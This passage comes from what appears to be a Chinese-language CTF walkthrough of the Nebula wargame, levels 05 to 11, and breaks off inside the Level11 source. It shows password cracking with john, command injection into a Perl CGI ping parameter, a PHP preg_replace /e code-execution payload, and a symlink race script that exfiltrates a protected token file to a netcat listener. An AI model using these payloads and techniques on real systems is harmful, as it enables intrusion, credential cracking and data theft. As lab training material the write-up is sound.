<li>id_rsa.pub<br>猜测这就是 <code>.ssh</code> 目录里的内容，所以可以直接ssh免密登录了<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">level05<span class="variable">@nebula</span><span class="symbol">:~</span><span class="variable">$ </span>ssh flag05<span class="variable">@127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span></span><br><span class="line">flag05<span class="variable">@nebula</span><span class="symbol">:~</span><span class="variable">$ </span>getflag</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="Level06">Level06</h1><p>这题涨姿势了，要我自己做，肯定是做不出来的，根据题目提示，到 <code>/home/flag06</code> 里去看，啥有用的也没发现，然后看了LL的wp后，才知道，重点是在 <code>/etc/password</code></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag06<span class="variable">@nebula</span><span class="symbol">:~</span><span class="variable">$ </span>cat /etc/passwd|grep flag06</span><br><span class="line"><span class="symbol">flag06:</span><span class="symbol">ueqwOCnSGdsuM:</span><span class="number">993</span><span class="symbol">:</span><span class="number">993</span><span class="symbol">:</span><span class="symbol">:/home/flag06</span><span class="symbol">:/bin/sh</span></span><br></pre></td></tr></table></figure>
<p>我猜测，这题的目的是让我们学如何破linux密码，但是<code>/etc/shadow</code> 普通用户不可读，所以把flag06在shadow的内容复制到passwd中</p>
<p>所以接下来就是破密码了, 使用 john命令，通过apt直接安装：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get <span class="operator"><span class="keyword">install</span> john</span><br><span class="line">......</span><br><span class="line">$ cat passwd</span><br><span class="line">flag06:ueqwOCnSGdsuM:<span class="number">993</span>:<span class="number">993</span>::/home/flag06:/<span class="keyword">bin</span>/sh</span><br><span class="line">$ john passwd</span><br><span class="line">Loaded <span class="number">1</span> <span class="keyword">password</span> hash (descrypt, traditional crypt(<span class="number">3</span>) [DES <span class="number">128</span>/<span class="number">128</span> SSE2-<span class="number">16</span>])</span><br><span class="line">Press <span class="string">'q'</span> <span class="keyword">or</span> Ctrl-C <span class="keyword">to</span> abort, almost <span class="keyword">any</span> other <span class="keyword">key</span> <span class="keyword">for</span> <span class="keyword">status</span></span><br><span class="line">hello            (flag06)</span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> <span class="number">100</span>% <span class="number">2</span>/<span class="number">3</span> <span class="number">2.631</span>g/s <span class="number">1981</span>p/s <span class="number">1981</span>c/s <span class="number">1981</span>C/s <span class="number">123456.</span>.marley</span><br><span class="line"><span class="keyword">Use</span> the <span class="string">"--show"</span> <span class="keyword">option</span> <span class="keyword">to</span> display <span class="keyword">all</span> <span class="keyword">of</span> the cracked passwords reliably</span><br><span class="line"><span class="keyword">Session</span> completed</span></span><br></pre></td></tr></table></figure>
<p>密码：hello<br>然后ssh登录，getflag</p>
<h1 id="Level07">Level07</h1><p>这题是perl的代码审计<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> CGI <span class="string">qw&#123;param&#125;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="sub"><span class="keyword">sub</span> ping &#123;</span></span><br><span class="line">  <span class="variable">$host</span> = <span class="variable">$_</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">@output</span> = <span class="string">`ping -c 3 $host 2&gt;&amp;1`</span>;</span><br><span class="line">  <span class="keyword">foreach</span> <span class="variable">$line</span> (<span class="variable">@output</span>) &#123; <span class="keyword">print</span> <span class="string">"<span class="variable">$line</span>"</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;"</span>);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># check if Host set. if not, display normal page, etc</span></span><br><span class="line"></span><br><span class="line">ping(param(<span class="string">"Host"</span>));</span><br></pre></td></tr></table></figure></p>
<p>虽然不懂Perl，但一看下就是$host没做任何过滤，所以可能会存在命令执行漏洞。这个脚本位于 <code>/home/flag07/index.cgi</code>, 然后通过 <code>thttpd.conf</code> 可知，这应该是使用http协议，监听了7007端口，然后接收Host参数，所以</p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl  http://<span class="number">192.168</span>.<span class="number">56.101</span>:<span class="number">7007</span>/index.cgi\?Host\=<span class="string">"127.0.0||whoami;"</span> </span><br><span class="line"><span class="variable">&lt;html&gt;</span><span class="variable">&lt;head&gt;</span><span class="variable">&lt;title&gt;</span>Ping results<span class="variable">&lt;/title&gt;</span><span class="variable">&lt;/head&gt;</span><span class="variable">&lt;body&gt;</span><span class="variable">&lt;pre&gt;</span>flag07</span><br><span class="line"><span class="variable">&lt;/pre&gt;</span><span class="variable">&lt;/body&gt;</span><span class="variable">&lt;/html&gt;</span></span><br><span class="line">$ curl  http://<span class="number">192.168</span>.<span class="number">56.101</span>:<span class="number">7007</span>/index.cgi\?Host\=<span class="string">"127.0.0||getflag;"</span></span><br><span class="line"><span class="variable">&lt;html&gt;</span><span class="variable">&lt;head&gt;</span><span class="variable">&lt;title&gt;</span>Ping results<span class="variable">&lt;/title&gt;</span><span class="variable">&lt;/head&gt;</span><span class="variable">&lt;body&gt;</span><span class="variable">&lt;pre&gt;</span>You have successfully executed getflag <span class="keyword">on</span> a target account</span><br><span class="line"><span class="variable">&lt;/pre&gt;</span><span class="variable">&lt;/body&gt;</span><span class="variable">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是最简单的方法，因为这题的目的就是让我们getflag, 不过还可以进行提高，怎么getshell呢？去看LL菊苣的wp吧。。。。我没做出来。。thttpd一直报400错误。。</p>
<h1 id="Level08">Level08</h1><p>这题是流量审计，在 <code>/home/flag08</code> 里面有一个pcap文件，拖到本地用Wireshark，然后发现全是TCP包，然后有些是包含一些不全的数据，这时候可以使用wireshark跟踪tcp流的功能</p>
<blockquote>
<p>右击任意一个TCP包，点击Follow TCP Stream<br><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-tcpl.png" alt="tcpl"></p>
</blockquote>
<p>然后查看密码的十六进制<br><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-tcpl2.png" alt="tcpl"></p>
<p>可知中间跟了几个0x7f(DEL)，所以密码是 <code>backd00Rmate</code></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>ssh flag08<span class="variable">@nebula</span></span><br><span class="line">flag08<span class="variable">@nebula</span><span class="symbol">:~</span><span class="variable">$ </span>getflag</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<h1 id="Level09">Level09</h1><p>这题是php代码审计:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">spam</span><span class="params">(<span class="variable">$email</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="variable">$email</span> = preg_replace(<span class="string">"/\./"</span>, <span class="string">" dot "</span>, <span class="variable">$email</span>);</span><br><span class="line">  <span class="variable">$email</span> = preg_replace(<span class="string">"/@/"</span>, <span class="string">" AT "</span>, <span class="variable">$email</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$email</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">markup</span><span class="params">(<span class="variable">$filename</span>, <span class="variable">$use_me</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="variable">$contents</span> = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$contents</span> = preg_replace(<span class="string">"/(\[email (.*)\])/e"</span>, <span class="string">"spam(\"\\2\")"</span>, <span class="variable">$contents</span>);</span><br><span class="line">  <span class="variable">$contents</span> = preg_replace(<span class="string">"/\[/"</span>, <span class="string">"&lt;"</span>, <span class="variable">$contents</span>);</span><br><span class="line">  <span class="variable">$contents</span> = preg_replace(<span class="string">"/\]/"</span>, <span class="string">"&gt;"</span>, <span class="variable">$contents</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$output</span> = markup(<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$argv</span>[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$output</span>;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>这题有两个可控点，<code>$filename</code>和<code>$use_me</code><br>然后涉及到两个知识点，一个是preg_replace已经被弃用的的/e(见[<a href="http://php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval" target="_blank" rel="external">http://php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval</a>])<br>会转义单引号，双引号，反斜杠和NULL，然后还会执行spam(“\2”)。。然后涉及到第二个知识点([ttp://php.net/manual/en/language.types.string.php#language.types.string.parsing]):<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">level09<span class="variable">@nebula</span><span class="symbol">:/home/flag09</span><span class="variable">$ </span>vim /tmp/payload</span><br><span class="line">[email &#123;<span class="variable">$&#123;</span>system(<span class="variable">$use_me</span>)&#125;&#125;]</span><br><span class="line">level09<span class="variable">@nebula</span><span class="symbol">:/home/flag09</span><span class="variable">$ </span>./flag09 /tmp/payload whoami</span><br><span class="line">flag09</span><br><span class="line">level09<span class="variable">@nebula</span><span class="symbol">:/home/flag09</span><span class="variable">$ </span>./flag09 /tmp/payload getflag</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure></p>
<h1 id="Level10">Level10</h1><p>这题又是C代码审计，本题目标是读取token文件内容<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;unistd.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;errno.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;sys/socket.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;netinet/in.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *file;</span><br><span class="line">  <span class="keyword">char</span> *host;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s file host\n\tsends file to host if you have access to it\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  file = argv[<span class="number">1</span>];</span><br><span class="line">  host = argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(access(argv[<span class="number">1</span>], R_OK) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">int</span> fd;</span><br><span class="line">      <span class="keyword">int</span> ffd;</span><br><span class="line">      <span class="keyword">int</span> rc;</span><br><span class="line">      <span class="keyword">struct</span> sockaddr_in <span class="built_in">sin</span>;</span><br><span class="line">      <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Connecting to %s:18211 .. "</span>, host); fflush(stdout);</span><br><span class="line"></span><br><span class="line">      fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">      <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">      <span class="built_in">sin</span>.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">      <span class="built_in">sin</span>.sin_port = htons(<span class="number">18211</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(connect(fd, (<span class="keyword">void</span> *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in)) == -<span class="number">1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Unable to connect to host %s\n"</span>, host);</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> HITHERE ".oO Oo.\n"</span></span><br><span class="line">      <span class="keyword">if</span>(write(fd, HITHERE, <span class="built_in">strlen</span>(HITHERE)) == -<span class="number">1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Unable to write banner to host %s\n"</span>, host);</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">undef</span> HITHERE</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Connected!\nSending file .. "</span>); fflush(stdout);</span><br><span class="line"></span><br><span class="line">      ffd = open(file, O_RDONLY);</span><br><span class="line">      <span class="keyword">if</span>(ffd == -<span class="number">1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Damn. Unable to open file\n"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      rc = read(ffd, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">      <span class="keyword">if</span>(rc == -<span class="number">1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Unable to read from file: %s\n"</span>, strerror(errno));</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      write(fd, buffer, rc);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"wrote file!\n"</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"You don't have access to %s\n"</span>, file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们需要给该程序传递两个参数，一个file(文件名), 一个host(主机名)，这个程序的功能是，先检查file是否可读，如果可读，则与host:18211建立tcp连接，然后open(file)，发送文件内容。如下测试该程序功能：<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">level10@nebula:/home/flag10$ vim /tmp/a</span><br><span class="line"><span class="header">ffffff</span><br><span class="line">--------</span></span><br><span class="line">; 在本机(192.168.56.1)上</span><br><span class="line">$ while [ 1 ];do nc -l 18211; done</span><br><span class="line"><span class="code">--------</span><br><span class="line">level10@nebula:/home/flag10$ ./flag10 /tmp/a 192.168.56.1</span><br><span class="line">Connecting to 192.168.56.1:18211 .. Connected!</span><br><span class="line">Sending file .. wrote file!</span><br><span class="line">--------</span></span><br><span class="line">; 本机</span><br><span class="line"><span class="title">.oO Oo.</span></span><br><span class="line">ffffff</span><br></pre></td></tr></table></figure></p>
<p>本题的漏洞在于，先是检查文件是否可读，但是并没有打开，如果检查完文件可读之后，在建立tcp连接的过程中，我把文件改成一个level10不可读，但是flag10可读的文件，程序任然能正常运行，过程如下：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">level1<span class="number">0</span><span class="variable">@nebula</span><span class="symbol">:/home/flag10</span><span class="variable">$ </span>vim /tmp/level1<span class="number">0</span>.sh</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="number">1</span> ];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        ln -sf /tmp/a /tmp/fff</span><br><span class="line">        ln -sf /home/flag1<span class="number">0</span>/token /tmp/fff     </span><br><span class="line">done</span><br><span class="line">level1<span class="number">0</span><span class="variable">@nebula</span><span class="symbol">:/home/flag10</span><span class="variable">$ </span>bash /tmp/level1<span class="number">0</span>.sh</span><br><span class="line">level1<span class="number">0</span><span class="variable">@nebula</span><span class="symbol">:/home/flag10</span><span class="variable">$ </span><span class="keyword">while</span> [ <span class="number">1</span> ]; <span class="keyword">do</span> ./flag1<span class="number">0</span> /tmp/fff <span class="number">192.168</span>.<span class="number">56.1</span>; done</span><br><span class="line">-----------</span><br><span class="line">; 你会在本机上看到token文件内容</span><br></pre></td></tr></table></figure></p>
<h1 id="Level11">Level11</h1><p>还是C代码审计<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;unistd.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;string.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;sys/mman.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> * Return a random, non predictable file, and return the file descriptor for it.</span><br><span class="line"> */</span></span><br><span class="line"></span><br><span class="line">int getrand<span class="params">(char **path)</span></span><br><span class="line">&#123;</span><br><span class="line">  char <span class="built_in">*</span>tmp;</span><br><span class="line">  int pid;</span><br><span class="line">  int fd;</span><br><span class="line"></span><br><span class="line">  srandom<span class="params">(time<span class="params">(NULL)</span>)</span>;</span><br><span class="line"></span><br><span class="line">  tmp = getenv<span class="params">(<span class="string">"TEMP"</span>)</span>;</span><br><span class="line">  pid = getpid<span class="params">()</span>;</span><br><span class="line">  </span><br><span class="line">  asprintf<span class="params">(path, <span class="string">"%s/%d.%c%c%c%c%c%c"</span>, tmp, pid,</span><br><span class="line">      'A' + <span class="params">(random<span class="params">()</span> % <span class="number">26</span>)</span>, '<span class="number">0</span>' + <span class="params">(random<span class="params">()</span> % <span class="number">10</span>)</span>,</span><br><span class="line">      'a' + <span class="params">(random<span class="params">()</span> % <span class="number">26</span>)</span>, 'A' + <span class="params">(random<span class="params">()</span> % <span class="number">26</span>)</span>,</span><br><span class="line">      '<span class="number">0</span>' + <span class="params">(random<span class="params">()</span> % <span class="number">10</span>)</span>, 'a' + <span class="params">(random<span class="params">()</span> % <span class="number">26</span>)</span>)</span>;</span><br><span class="line"></span><br><span class="line">  fd = open<span class="params">(*path, O_CREAT|O_RDWR, <span class="number">0600</span>)</span>;</span><br><span class="line">  unlink<span class="params">(*path)</span>;</span><br><span class="line">  return fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void process<span class="params">(char *buffer, int length)</span></span><br><span class="line">&#123;</span><br><span class="line">  unsigned int key;</span><br><span class="line">  int i;</span><br><span class="line"></span><br><span class="line">  key = length &amp; <span class="number">0</span>xff;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span><span class="params">(i = <span class="number">0</span>; i &lt; length; i++)</span> &#123;</span><br><span class="line">      buffer[i] ^= key;</span><br><span class="line">      key -= buffer[i];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  system<span class="params">(buffer)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">#</span>define CL <span class="string">"Content-Length: "</span></span><br><span class="line"></span><br><span class="line">int main<span class="params">(int argc, char **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  char line[<span class="number">256</span>];</span><br><span class="line">  char buf[<span class="number">1024</span>];</span><br><span class="line">  char <span class="built_in">*</span>mem;</span><br><span class="line">  int length;</span><br><span class="line">  int fd;</span><br><span class="line">  char <span class="built_in">*</span>path;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span><span class="params">(fgets<span class="params">(line, sizeof<span class="params">(line)</span>, stdin)</span> == NULL)</span> &#123;</span><br><span class="line">      errx<span class="params">(<span class="number">1</span>, <span class="string">"reading from stdin"</span>)</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span><span class="params">(strncmp<span class="params">(line, CL, strlen<span class="params">(CL)</span>)</span> != <span class="number">0</span>)</span> &#123;</span><br><span class="line">      errx<span class="params">(<span class="number">1</span>, <span class="string">"invalid header"</span>)</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  length = atoi<span class="params">(line + strlen<span class="params">(CL)</span>)</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span><span class="params">(length &lt; sizeof<span class="params">(buf)</span>)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span><span class="params">(fread<span class="params">(buf, length, <span class="number">1</span>, stdin)</span> != length)</span> &#123;</span><br><span class="line">          err<span class="params">(<span class="number">1</span>, <span class="string">"fread length"</span>)</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      process<span class="params">(buf, length)</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      int blue = length;</span><br><span class="line">      int pink;</span><br><span class="line"></span><br><span class="line">      fd = getrand<span class="params">(&amp;path)</span>;</span><br><span class="line"></span><br><span class="line">      while<span class="params">(blue &gt; <span class="number">0</span>)</span> &#123;</span><br><span class="line">          printf<span class="params">(<span class="string">"blue = %d, length = %d, "</span>, blue, length)</span>;</span><br><span class="line"></span><br><span class="line">          pink = fread<span class="params">(buf, <span class="number">1</span>, sizeof<span class="params">(buf)</span>, 